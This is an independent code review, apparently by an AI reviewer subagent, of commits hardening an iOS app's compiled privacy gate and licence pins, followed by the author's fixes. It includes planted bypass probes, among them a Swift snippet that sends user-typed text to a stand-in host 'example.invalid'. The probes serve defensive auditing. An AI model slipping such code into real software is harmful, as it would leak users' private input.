---
record_type: review
id: backlog-gates-review-round-1
status: ratified
seat: independent
process_version: v6.6
date: 2026-10-14
---
# Independent review: the gates and licences wave (#253, #247, #246, #244, #261, D-197)

**Reviewer:** Code-Reviewer subagent (fresh eyes; did not author any commit in the range)
**Independent:** yes
**Date:** 2026-10-14
**Commit range:** `2891f15..ab38540` (11 commits, `62bf419` to `ab38540`)
**Risk tier:** HIGH for #244 and #246 (the compiled privacy gate, INV-62, INV-64, INV-67); MEDIUM for
the rest

## Verdict
MAJOR

The licence texts are right, word for word. The three copyright lines are right. The pins now read the
code a build compiles, and A1 reads the pairs both ways. `make check-fast` passes in the seat.

Two gates refuse less than their rows say:
- **M1.** The engine client's member list (#244) is matched by prefix, and for every file. An
  initialiser or a member whose name extends a listed one passes the compiled gate.
- **M2.** `STORE_URL_MAKERS` (#246) is not an allowlist. No entry can ever match, so the rule is a
  refusal of two names. A URL parsed from text with `URL.ParseStrategy` passes in `FrontDoor.swift`.

The text pins refuse every spelling I planted for M1 and M2. So nothing leaves the phone today that
did not before. But the gap register, INV-62, INV-64, INV-67 and the process log claim more than the
compiled gate holds. That is the class D-192 asks us not to write.

Five minor findings are left (N1 to N5). The wave can close once M1 and M2 are fixed, or their claims
narrowed, and each minor finding is fixed or filed.

How the review was done:
- **Reading.** I read the five issues, the 11 commits' diff, D-176, D-179, D-156, D-193, D-194 and
  D-197, the gap register and rows INV-62 to INV-78, and the gate's request, store and capability
  rules.
- **Gates.** `make check-fast` in the seat passed in 113 s: lint, typecheck, records, test, swift-test
  and client-decls.
- **Licences.** I hashed the fetched LICENSE files with the test's own folding (whitespace joined), and
  compared the app's texts byte for byte.
- **Plants.** I exported `HEAD` to a scratch tree outside the seat (`git archive`). Each fault went into
  that tree, the named pins or the compiled gate ran on it, and the file was restored. A byte compare
  after each run showed the scratch file equal to the seat's. The seat's tree is unchanged
  (`git diff --quiet HEAD`). The compiled plants ran through the gate's own `dump_ast`, `references`,
  `problems` and `unseen_permissions`, on the scratch folder.
- **Held-out discipline.** I read no held-out file.

## Findings

### BLOCKING
- none

### MAJOR

- **M1** `scripts/client_decl_gate.py:342-344` (`ENGINE_CLIENT_REACHABLE`) and `:1976-1983`
  (`_engine_client_problem`): the list is matched by prefix, and it is one list for every file.
  - **Why.** The test is `any(symbol.startswith(member) ...)`. So `EngineClient.init(` admits every
    initialiser, and `EngineClient.baseURL` admits any member whose name starts with `baseURL`.
  - **Measured, in all four configurations, 0 refusals each:**
    - an `init(asking typed: String)` in `EngineClient.swift` that starts a `Task` sending `typed` as the
      surface, called from `ContentView.swift` as `EngineClient(asking: typed)`. The request rule does
      not see it either: `_request_call` reads only calls whose callee is a `dot_syntax_call_expr`, and a
      constructor's is not.
    - a closure property `var baseURLSender: (String) async throws -> Recommendation` that forwards to
      `recommendation(task:budget:)`, called from the screen as `client.baseURLSender(typed)`.
  - **Measured, simulator Release, 0 refusals:** `FrontDoor.swift` loads
    `Data(contentsOf: EngineClient().baseURL.appendingPathComponent(typed))`. The list lets a store read
    the engine's address. Only `ContentView.swift` and `Models.swift` reach the client today
    (`ENGINE_CLIENT_SHIPPING`, `tests/unit/test_client_decl_gate.py:906-910`).
  - **What holds them.** The text pin `test_the_engine_calls_take_only_the_spellings_of_task_and_budget_the_pin_reads`
    refuses the first two as written. The egress check refuses the third, through its second
    `contentsOf:`. The subscript and the key path round two found are refused by the compiled gate, as
    claimed (planted on the shipping client too).
  - **The claims.** `docs/process-log.md:854-855` says "another file reaches only the six engine-client
    members". G-11 (`docs/security-invariants.md:195`) says another file reaches the client "only through
    `ENGINE_CLIENT_REACHABLE`". INV-64 (`:125`) lists the rule as held.
  - **Failure scenario.** A refactor adds a convenience initialiser that sends what it is handed, and
    calls it with a name other than `client.`. `make client-decls` passes. Only a text pin's spelling
    stands between the typed text and the engine.
  - **Remedy.** Match the full selector exactly, per file: `ContentView.swift` gets its five members and
    `Models.swift` gets `maxStandingsBytes`. Plant the `init(asking:)` twin in the fixture.
    - I tried `symbol in ENGINE_CLIENT_REACHABLE` in the scratch gate. Three fixture tests then fail,
      since the fixture's other files reach members the list does not name. So the fixture's expected
      refusals and its committed dump move with the change.
    - Or narrow G-11, INV-64 and the process log to "a member whose name does not begin with a listed
      one".

- **M2** `scripts/client_decl_gate.py:159-168` (`STORE_URL_MAKERS`, `URL_MADE_BY_NAME`) and `:1924-1930`
  (`_store_url_problem`): the allowlist allows nothing and refuses nothing.
  - **Why.** A symbol reaches the `not in STORE_URL_MAKERS` test only when it matches
    `^(?:URL|NSURL)\.(?:init\(|decoded\b)`. No entry of `STORE_URL_MAKERS` matches that pattern, so the
    test is always true. The rule is a refusal of `URL.init(`, `NSURL.init(` and `URL.decoded` in the
    two stores.
  - **Mutant.** I removed `and symbol not in STORE_URL_MAKERS` from the scratch gate. All 129 tests of
    `test_client_decl_gate.py` pass.
  - **Measured, four configurations, 0 refusals each:** this in `FrontDoor.swift`:

    ```swift
    func reviewProbeParse(_ typed: String) -> Data? {
        guard let target = try? URL.ParseStrategy().parse("ht" + "tps://example.invalid/?q=" + typed) else { return nil }
        return try? Data(contentsOf: target)
    }
    ```

    - In `StandingsStore.swift` the same code is refused, by the privacy sink's Foundation list.
    - #246's own round-3 probe is refused in `FrontDoor.swift`, as claimed.
  - **What holds it.** The egress check refuses the second `contentsOf:`. G-13 does not name this form:
    its "still not held" covers a URL from another file and a cast, not a Foundation parse in the store.
  - **The claims.** G-13 (`docs/security-invariants.md:197`), INV-62 (`:123`) and INV-67 (`:128`) say "a
    store makes a URL only by the calls `STORE_URL_MAKERS` lists". So do the gate's comment (`:159-162`)
    and `docs/process-log.md:852`. #246 offered two remedies: an allowlist, or refusing
    `URL.init(_:strategy:)` and a cast to `URL`. The wave did the first half of the second and wrote up
    the first.
  - **Failure scenario.** A change to the gap register parses an address with a format style or a parse
    strategy and loads it. `make client-decls` passes. The text pin holds only while the load is spelled
    with `contentsOf:`.
  - **Remedy.** Make it an allowlist. For example, give `FrontDoor.swift` a Foundation list measured on
    the shipping file, as `SINK_FOUNDATION_ALLOWED` does for the standings store, with the makers on it.
    Then plant the parse strategy in `scripts/client_decl_fixtures/FrontDoor.swift`. Or drop
    `STORE_URL_MAKERS` and narrow the four records to what the code refuses: a URL initialiser or decode
    by name.

### MINOR (the author fixes each in this wave or files it as an issue)

- **N1** `tests/unit/test_credits.py:265-277`, D-197 clause 3 (`docs/decisions.md:5072-5074`): the hash
  pin reads `Models.swift` raw and takes the first match, so a dead copy satisfies it.
  - **Measured.** I changed clause 4(a) of the live Apache text ("You must give" to "You may give").
    Alone, the pin fails. With a correct copy above it under `#if false`, or inside `/* */`, all 34 tests
    of `test_credits.py` pass. The Swift test checks four phrases, so it passes too.
  - **Why it matters.** The line says `# raw: the text itself, not code`. But the text is code: it is the
    Swift literal the app compiles. This is the class #247 closed, reopened in a new pin.
  - **Remedy.** Read through `_swift` from `test_ios_client_contract.py`, which keeps string literals and
    blanks dead branches and block comments. Or assert that `static let {name} = """` occurs exactly
    once.

- **N2** `src/app/workflows/board_tables.py:97-101` and `:124-126`, D-197 (`docs/decisions.md:5059-5060`,
  `:5070-5071`): the ARC-AGI-2 solutions the engine scores against are Apache-2.0, and their notice is
  not carried.
  - **What is true.** `scripts/derive_arc_public_eval.py:20-21` and `:45` score unmarked attempts against
    `arcprize/ARC-AGI-2` at a pinned commit. D-194 clause 3 (`docs/decisions.md:4883`) names that
    repository Apache-2.0. The fetched `arc-gh-LICENSE` is the Apache-2.0 text with
    `Copyright 2019 ARC Prize Foundation.` in its appendix.
  - **What the wave says.** D-197 lists the ARC Prize runs as MIT only. `PUBLISHES_NO_NOTICE` names
    `arc_prize` because "the dataset holds no LICENSE file". That is true of the Hugging Face runs, not of
    the solutions.
  - **Failure scenario.** D-197 clause 1 carries the texts so that it "holds under either reading". Under
    the strict reading, one Apache-2.0 source's copyright line is missing from the sheet.
  - **Remedy.** Confirm the LICENSE at commit `f3283f72`. Then either carry its copyright line as
    `arc_prize`'s notice and name both licences on the credit, or record in D-197 why the solutions
    are out of section 4's reach. Either way, update `PUBLISHES_NO_NOTICE`'s reason and D-197's list.

- **N3** `scripts/check_records.py:1578`: A1's reverse check reads only a pointer at the start of a line.
  The forward check (`:1571`) finds one anywhere in the body.
  - **Measured.** In a scratch copy of the log I put `**Amended by D-150 (2026-10-14)**: nothing.` in the
    middle of D-170's pointer line (`docs/decisions.md:3491`). A1 reports nothing. The same pointer on a
    line of its own is refused. Reverting either of #253's two `Amends` edits is refused, as claimed.
  - **Why it matters.** D-170 already holds two pointers on one line, so the shape is in the log today.
  - **Remedy.** Drop the `^` from the reverse loop's pattern, or require each pointer on its own line and
    split D-170's. Add the mid-line case to
    `test_an_amended_by_pointer_whose_adr_declares_no_such_amendment_is_refused`.

- **N4** Records left behind by the closing of G-15 and the move of G-11 and G-13 to #242:
  - `docs/prd.md:468` (REQ-RTR-004) still cites G-15.
  - `docs/prd.md:469` (REQ-RTR-005) still says the fallback pin "reads the Swift without `_code`, so a
    `/* */` copy ... satisfies it: G-15, #247". That is no longer true.
  - `docs/prd.md:554` (REQ-GAP-001) still names G-11 (#244), G-13 (#246) and G-15 (#247).
  - `tests/unit/test_router_hints.py:80-82` (`_code`'s docstring) says "Eight pins here read the app's
    Swift without it". `:516` and `:590` say each pin "reads the Swift without `_code`".
  - `tests/unit/test_security_invariants.py:292-300` and `:393-397` check two G-15 sentences that no row
    can carry now. They are dead code.
  - INV-78 (`docs/security-invariants.md:150`) says an undecidable condition keeps its code. Measured: the
    backup exclusion under `#if os(watchOS)` still passes the gap-register pin. Round 5 measured this and
    G-15 named it. Now no gap names it. One sentence in G-14 or INV-78 would.
  - **Remedy.** Correct each. None changes code.

- **N5** Small slips.
  - `ios/ModelRanking/Engine/Language.swift:395-396`: the new `creditsLicenceTexts` was inserted under
    `creditsNotSent`'s doc comment. It now carries two comments, and `creditsNotSent` has none.
  - `tests/unit/test_router_hints.py:828`: `# raw: not Swift` is written twice on one line.

### PASS (what looks good)
- **Licence texts.** The app's `apache20` is byte-identical to Terminal-Bench's LICENSE (less its final
  newline). Folded, it hashes to `0ffddef9...`, the pinned value, and so do Aider's and Terminal-Bench's
  files. The app's `mit` is byte-identical to the terms of models.dev's LICENSE, from "Permission is
  hereby granted". Folded, LiteLLM's and models.dev's terms both hash to `fe2a9817...`, the pinned value.
  No backslash in either literal, and the closing `"""` is at column 0, so Swift keeps them as written.
- **Copyright lines.** `Copyright (c) 2023 Berri AI`, `Copyright (c) 2025 models.dev` and
  `Copyright 2022 Stanford University` are each the line in the fetched file. HELM's file differs from
  the template only in that line. Aider's and Terminal-Bench's appendices are unfilled, as
  `PUBLISHES_NO_NOTICE` says. Each NOTICE fetch returned 404, consistent with "No publisher here has a
  NOTICE file".
- **The sheet.** `CreditsScreen.licenceTexts` (`Models.swift:433`) shows each licence once, in the
  order the credits first name it, and only for listed credits. `Text(licence.text)` takes a `String`,
  so nothing becomes a link. The two `apache.org` addresses are permitted exactly once each, the longer
  first (`tests/unit/test_router_hints.py:717-718`).
- **#247.** Measured: the backup exclusion under `#if false`, or inside `/* */`, now fails the
  gap-register pin. INV-71's ceiling changed to `Int.max` beside a `/* */` copy now fails its pin.
  `_without_block_comments` keeps every newline, `//` comments and string literals.
- **#253.** Both new `Amends` fields are supported by their ADRs' text: D-176's context names D-136's
  English remainder, and D-179's body rules on D-156 clause 3's expiry night.
- **#244, #246 as far as they go.** The subscript, the key path to the surface and #246's round-3 probe
  are each refused on the shipping client, not only in the fixture.
- **Counts.** 90 rows, 18 held in part, 10 open gaps. Every open gap is cited by a partial row, and no
  partial row cites G-15.

## Producers of the hardened invariants
- **INV-64, the request's sources.**
  - Producers: assignments to `ContentView.task` (`apply`, `select(_:)`), key paths to it, and the
    engine client's members reached from another file.
  - Citing tests: `test_the_fixtures_six_request_shapes_are_refused_and_its_own_request_is_not`
    (`tests/unit/test_client_decl_gate.py:569`), `test_round_two_twins_of_the_surface_are_refused`
    (`:896`), `test_a_file_reaches_only_the_engine_clients_listed_members` (`:913`).
  - Gaps: M1; G-11 (#242).
- **INV-62 and INV-67, the stores' URLs.**
  - Producers: `FrontDoor.swift` and `StandingsStore.swift`.
  - Citing tests: `test_a_store_makes_a_url_only_from_the_file_systems_folders` (`:877`),
    `test_the_stores_shipping_urls_pass` (`:890`), and the fixture's `FrontDoor.swift`.
  - Gaps: M2; G-13 (#242).
- **INV-78, how pins read Swift.**
  - Producers: every pin in `test_router_hints.py` and `test_ios_client_contract.py`.
  - Citing tests: `test_a_swift_read_in_this_file_goes_through_code`
    (`tests/unit/test_router_hints.py:1171`),
    `test_swift_blanks_a_block_comment_and_keeps_its_lines_and_line_comments`
    (`tests/unit/test_ios_client_contract.py:1666`).
  - Gaps: N1 (a new raw pin in `test_credits.py`); N4 (an undecidable condition).

## Acceptance criteria evidence
- **#253, A1 refuses a pointer its source does not declare.** Code: `scripts/check_records.py:1576-1586`.
  Test: `tests/unit/test_wave_check_m21_rules.py:806`. The two pointers: `docs/decisions.md:3783` and
  `:3907`. Reverting either is refused (measured). The mid-line form is not (N3).
- **#247, every pin reads through `_code`, with a guard.** Guard: `tests/unit/test_router_hints.py:1171`.
  `_swift` blanks block comments: `tests/unit/test_ios_client_contract.py:35-43`, held at `:1666`. The
  `#if false` plant fails the gap-register pin (measured; no committed test plants it on the shipping
  file, though `_code`'s own tests hold the drop).
- **#246, the round's probe is refused in a store.** Fixture: `scripts/client_decl_fixtures/FrontDoor.swift`,
  `FIXTURE_REFUSALS` (`scripts/client_decl_gate.py:443`). Test: `tests/unit/test_client_decl_gate.py:877`.
  The allowlist half is not real (M2).
- **#244, round two's twins refused.** Fixture: `scripts/client_decl_fixtures/ContentView.swift:256-275`
  and `EngineClient.swift:56-59`. Tests: `tests/unit/test_client_decl_gate.py:896`, `:913`. The list is a
  prefix match (M1). The router's outcomes (INV-69, INV-70) moved to #242, as #244 allowed.
- **#261, texts and notices.** Engine: `src/app/workflows/board_tables.py:89-101`, held by
  `tests/unit/test_credits.py:238`. Texts: `ios/ModelRanking/Engine/Models.swift:453`, `:659`, held by
  `tests/unit/test_credits.py:265` (weakly, N1). Sheet: `ios/ModelRanking/ContentView.swift:759`, `:772`;
  logic held by `ios/EngineTests/CreditsTests.swift:93`, which is on the manifest. ARC's notice: N2.

## K.8 contract drift check
- `/v1`'s credits gain `notice`, additively; an older engine sends none and the phone reads it.

  ```
  src/app/workflows/board_tables.py:92:    notice: str | None = None
  ios/ModelRanking/Engine/Models.swift:383:    let notice: String?
  ios/ModelRanking/Engine/Models.swift:403:        case notice
  ios/ModelRanking/Engine/Models.swift:689:    let notice: String?
  ```
- The gate's new names:

  ```
  scripts/client_decl_gate.py:163:STORE_URL_MAKERS = frozenset({
  scripts/client_decl_gate.py:168:URL_MADE_BY_NAME = re.compile(r"^(?:URL|NSURL)\.(?:init\(|decoded\b)")
  scripts/client_decl_gate.py:342:ENGINE_CLIENT_REACHABLE = ("EngineClient.init(", "EngineClient.baseURL", "EngineClient.boards(",
  ```
- Verdict: OK. D-197 clause 2 records the field.

## K.9 candidates spotted outside this wave's scope
- **K1** `scripts/client_decl_gate.py:1668-1684` (`_request_call`): the request rule reads only labelled
  arguments of a method call. An argument with no label, or a call to an initialiser, is skipped. Today
  no listed member takes such an argument, so this is latent behind M1's list. It becomes live the day a
  request method or initialiser with an unlabelled parameter is listed. Bug, for #242's scope.

## Risks queued to next M
- **R1** CI's Linux lane runs only the text pins (G-10). So M1's and M2's forms are held there, as on a
  Mac, only by the pins' spellings. The sign it is real: a planted twin with no `client.` call and no
  `contentsOf:` label passes both the pins and the gate.

## Dispositions, by the author

| Finding | Disposition | Where |
|---|---|---|
| M1 | Fixed. `ENGINE_CLIENT_REACHABLE` is a list per file, each member matched whole (measured on the shipping client in the four configurations). The fixture plants an `init(asking:)` and a `baseURLSender` member, called from the screen; both are refused, and so is `Detail.swift`'s reach. G-11, INV-64's gap row and the process log say so. | `scripts/client_decl_gate.py`, `scripts/client_decl_fixtures/`, `tests/unit/test_client_decl_gate.py` |
| M2 | Fixed. `STORE_URL_MAKERS` is gone. `FrontDoor.swift` references only the Foundation declarations `STORE_FOUNDATION_ALLOWED` lists (measured on the shipping file, the four configurations), so a parse strategy or a format style is refused by absence; a URL initialiser or decode stays refused in both stores. The fixture plants the review's parse strategy. G-13, INV-62, INV-67 and the process log say so. | same |
| N1 | Fixed. The hash pin reads `Models.swift` through `_swift` and requires one live copy of each text. A correct copy under `#if false` above a changed live text now fails it (planted, then restored). | `tests/unit/test_credits.py` |
| N2 | Fixed. The LICENSE at `f3283f72` is Apache-2.0 with `Copyright 2019 ARC Prize Foundation.` The solutions get their own credit, `arc_prize_solutions`, cited beside `arc_prize`; `PUBLISHES_NO_NOTICE`'s reason and D-197 say so. | `src/app/workflows/board_tables.py`, `rank.py`, D-197 |
| N3 | Fixed. A1's reverse check reads a pointer anywhere on a line; the mid-line case is in the test. | `scripts/check_records.py`, `tests/unit/test_wave_check_m21_rules.py` |
| N4 | Fixed. `prd.md` REQ-RTR-004, REQ-RTR-005 and REQ-GAP-001, the three docstrings and the dead G-15 patterns are corrected or removed; G-14 names a required line kept under `#if os(watchOS)`. | `docs/prd.md`, `tests/unit/test_router_hints.py`, `tests/unit/test_security_invariants.py`, `docs/security-invariants.md` |
| N5 | Fixed. Each function has its own doc comment again, and the doubled `# raw:` is one. | `Language.swift`, `test_router_hints.py` |
| K1 | Filed on #242, whose scope it is. | #242 |
| R1 | Accepted: G-10, the owner's macOS lane (#243). | none |

